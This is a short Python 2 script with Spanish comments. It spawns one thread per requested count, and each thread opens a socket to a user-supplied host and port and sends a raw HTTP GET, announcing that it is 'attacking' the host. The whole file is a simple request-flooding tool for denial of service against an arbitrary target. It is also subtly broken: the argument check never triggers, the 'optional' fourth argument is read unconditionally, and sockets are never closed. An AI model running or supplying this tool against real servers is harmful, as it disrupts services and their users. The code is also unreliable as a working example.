# coding=utf-8
#Este código recibe 3 parámetros: [1] el host sin http, [2] el puerto, [3] la cantidad de peticiones y [4] información
#Los primeros 3 parámetros son indispensables, el 4 es opcional
"""
FUNCIONALIDAD:
Realiza peticiones GET por http
"""

import socket, sys, os
import threading

def attack(num):
    #pid = os.fork()
    #Hace la conección
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Pasa el host y el puerto para hacer el ataque
    s.connect((sys.argv[1], int(sys.argv[2])))
    #Imprime los datos envíados
    if sys.argv[4]:
        print ">> GET /" + sys.argv[4] + " HTTP/1.1 ::: numero: " + str(num)
        #Hace el envío de las peticiones
        s.send("GET /" + sys.argv[4] + " HTTP/1.1\r\n")
        s.send("Host: " + sys.argv[1]  + "\r\n\r\n")
    else:
        print ">> GET / HTTP/1.1"
        #Hace el envío de las peticiones
        s.send("GET / HTTP/1.1\r\n")
        s.send("Host: " + sys.argv[1]  + "\r\n\r\n")            
    #cierra el servidor
    #s.close()

def main():
    if len(sys.argv) < 1:
        print "Este script requiere al menos 3 parámetros"
    else:
        print ">>>>> Atacando al host " + sys.argv[1]  + " ]"
        print "Puerto " + sys.argv[2];
        print "Datos inyectados " + sys.argv[4] + "\n";
        #Crea el pull de hilos
        threads = list()
        for i in range(1, int(sys.argv[3])):
            #Lanza el proceso de reubicación y conversión en un hilo
            t = threading.Thread(target=attack, args=(i,))
            #Inicia y lanza el hilo
            threads.append(t)
            t.start()        

if __name__ == '__main__': main()